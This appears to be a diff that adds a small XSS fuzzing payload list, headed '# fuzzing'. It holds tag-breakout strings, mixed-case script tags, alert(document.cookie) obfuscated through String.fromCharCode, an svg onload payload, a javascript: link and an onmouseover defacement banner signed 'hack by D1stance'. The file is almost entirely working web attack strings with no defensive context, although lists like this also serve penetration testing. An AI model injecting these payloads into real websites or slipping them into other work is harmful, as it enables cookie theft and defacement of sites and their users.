@@ -1,0 +1,21 @@
+# fuzzing
+`'">xss
+`abc"<'">xss
+'"><h1>test</H1>
+'"><sCrIpt>alert(1)</scRipT>
+
+//  alert(1)
+eval(String.fromCharCode(97,108,101,114,116,40,49,41))
+
+//  alert(document.cookie)
+eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))
+
+<h1><ceNteR onmouseover=alert(1) style="background-color:black;color:green;font-size:50px;">hack by D1stance</CenTer></h1>
+
+<a+href%3Djavascript:alert(document.cookie)>+[+點我A_A+]+<%2Fa>
+
+
+
+"><ceNteR><h1>XSS test</h1></CenTer>
+"><h1>1</h1>
+"><svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
